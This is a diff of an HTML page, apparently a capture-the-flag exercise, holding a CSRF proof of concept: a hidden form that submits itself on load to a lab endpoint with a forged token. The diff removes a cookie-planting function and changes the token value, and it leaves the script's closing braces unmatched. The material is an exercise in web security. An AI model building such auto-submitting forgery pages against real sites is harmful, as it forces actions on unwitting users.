@@ -10,22 +10,6 @@
     <link rel="stylesheet" type="text/css" href="stylesheets/github-light.css" media="screen">
     
     <script type="javascript">
-    $(window).load(function () {
-
-      var createCookie = function(name, value, days) {
-    var expires;
-    if (days) {
-        var date = new Date();
-        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
-        expires = "; expires=" + date.toGMTString();
-    }
-    else {
-        expires = "";
-    }
-    document.cookie = name + "=" + value + expires + "; path=/";
-}
-
-createCookie('csrftoken', 'secret', 3); 
 document.getElementById('theForm').submit();
 
 });
@@ -46,7 +30,7 @@ document.getElementById('theForm').submit();
       <form method="POST" id="theForm" action="http://ctf.sentorkurs.se/ctf/labdata/csrf3.php">
 Username:
 <input type="text" name="username" value="anna">
-<input type="hidden" name="csrftoken" value="secret">
+<input type="hidden" name="csrftoken" value="0">
 <input type="submit" value="OK">
 </form>
       
